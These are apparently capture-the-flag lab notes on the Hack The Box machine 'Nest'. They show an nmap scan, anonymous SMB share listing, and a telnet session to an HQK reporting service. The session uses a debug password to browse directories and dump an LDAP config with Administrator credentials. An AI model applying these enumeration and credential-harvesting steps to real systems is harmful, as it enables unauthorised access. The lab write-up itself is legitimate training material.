# Nmap
```shell
─$ nmap 10.10.10.178 -Pn 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-01 03:15 EDT
Nmap scan report for 10.10.10.178
Host is up (0.043s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT    STATE SERVICE
445/tcp open  microsoft-ds

```


# SMB
```shell
─$ smbclient -L \\10.10.10.178 -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Data            Disk      
        IPC$            IPC       Remote IPC
        Secure$         Disk      
        Users           Disk      

```
```shell
└─$ nmap -p4386 10.10.10.178 -Pn -A
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-01 03:30 EDT
Nmap scan report for 10.10.10.178
Host is up (0.024s latency).

PORT     STATE SERVICE VERSION
4386/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, NULL, RPCCheck, SSLSessionReq, TerminalServerCookie: 
|     Reporting Service V1.2
|   GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     Reporting Service V1.2
|     Unrecognised command
|   Help: 
|     Reporting Service V1.2
|     This service allows users to run queries against databases using the legacy HQK format
|     AVAILABLE COMMANDS ---
|     LIST
|     SETDIR <Directory_Name>
|     RUNQUERY <Query_ID>
|     DEBUG <Password>
|_    HELP <Command>

```
## SMB Users
```shell
└─$ smbclient \\\\10.10.10.178\\Users -U "" 
Password for [WORKGROUP\]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Jan 25 18:04:21 2020
  ..                                  D        0  Sat Jan 25 18:04:21 2020
  Administrator                       D        0  Fri Aug  9 11:08:23 2019
  C.Smith                             D        0  Sun Jan 26 02:21:44 2020
  L.Frost                             D        0  Thu Aug  8 13:03:01 2019
  R.Thompson                          D        0  Thu Aug  8 13:02:50 2019
  TempUser                            D        0  Wed Aug  7 18:55:56 2019

```

# Secure
```shell
└─$ cat *            
ipconfig /flushdns
ipconfig /release
ipconfig /renew
-- HANDY MMC SNAP INS --

compmgmt.msc
services.msc
dsa.msc
gpmc.msc                 
```

# Admin Password
Connecting to the HQK service allows us to get the admin pass
```shell
└─$ telnet 10.10.10.178 4386
Trying 10.10.10.178...
Connected to 10.10.10.178.
Escape character is '^]'.

HQK Reporting Service V1.2

>WBQ201953D8w

Unrecognised command
>DEBUG WBQ201953D8w

Debug mode enabled. Use the HELP command to view additional commands that are now available
>setdir LDAP

Error: The specified directory does not exist
>setdir ..

Current directory set to HQK
>LIST

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  ALL QUERIES
[DIR]  LDAP
[DIR]  Logs
[1]   HqkSvc.exe
[2]   HqkSvc.InstallState
[3]   HQK_Config.xml

Current Directory: HQK
>setdri LDAP

Unrecognised command
>setdir LDAP    

Current directory set to LDAP
>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[1]   HqkLdap.exe
[2]   Ldap.conf

Current Directory: LDAP
>showquery 2

Domain=nest.local
Port=389
BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
User=Administrator
Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
xtH4nkS4PI4y1nGX

>

```